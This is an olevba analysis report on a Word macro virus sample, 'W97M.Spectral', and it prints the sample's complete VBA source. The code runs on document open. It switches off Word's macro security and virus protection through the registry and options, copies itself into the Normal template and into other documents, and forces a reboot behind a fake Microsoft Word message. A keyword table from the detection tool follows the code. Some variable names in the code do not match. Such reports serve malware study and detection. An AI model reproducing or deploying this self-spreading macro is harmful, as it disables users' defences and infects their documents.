olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.s - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Zmk.s - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function ExitWindowsEx Lib "User32" (ByVal fuOptions As Integer, ByVal Reserved As Integer) As Boolean
Private Declare Function ShellExecute Lib "Shell32" Alias "ShellExecuteA" (ByVal hWnd As Integer, ByVal lpszOp As String, ByVal lpszFile As String, ByVal lpszParams As String, ByVal lpszDir As String, ByVal wShowCmd As Integer) As Integer
Private Sub Document_Open()
' W97M.Spectral by Draconia
' Member of Virus Quest
' Copyright@1999
On Error GoTo ErrorDcOe:
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End If
iMacroNormalDotCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNormalDotCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "Spectral" Then
        DropScreamInstalled = -1
    End If
Next i
If Not SpectralInstalled Then
    ActiveDocument.VBProject.VBComponents("Spectral").Export "C:\Av.log"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\Av.log"
    NormalTemplate.VBProject.VBComponents("Spectral").CodeModule.DeleteLines 1, 4
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SpectralInstalled") <> "Yes" Then
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SpectralInstalled") = "Yes"
        Call Payload
    End If
Else
iMacroActiveDctCount = ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroActiveDctCount
    If ActiveDocument.VBProject.VBComponents(i).Name = "Spectral" Then
        DropScreamDocInstalled = -1
    End If
Next i
If Not SpecDocInstalled Then
    NormalTemplate.VBProject.VBComponents("Spectral").Export "C:\Av.log"
    ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\Av.log"
    ActiveDocument.VBProject.VBComponents("Spectral").CodeModule.DeleteLines 1, 4
    ActiveDocument.Save
    With Assistant.NewBalloon
        .Button = msoButtonSetOK
        .Heading = "Tips:"
        .Text = "Get yourself a good quality Anti-Virus software!" & Chr(13) & "Thanks to F-Prot, AVP, NAV, McAffee, Dr Solomon!!!"
        .Show
    End With
End If
End If
ErrorDcOe:
End Sub
Private Sub Payload()
On Error GoTo ErrorPDSc
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End If
Const EWX_REBOOT As Integer = 2
Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Microsoft Word"
    .Text = "Important:" & Chr(13) & "Becareful, you must reboot your PC, now! I'm outta here!"
    .Show
End With

ExitWindowsEx EWX_REBOOT, 0
ErrorPDSc:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecuteA       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

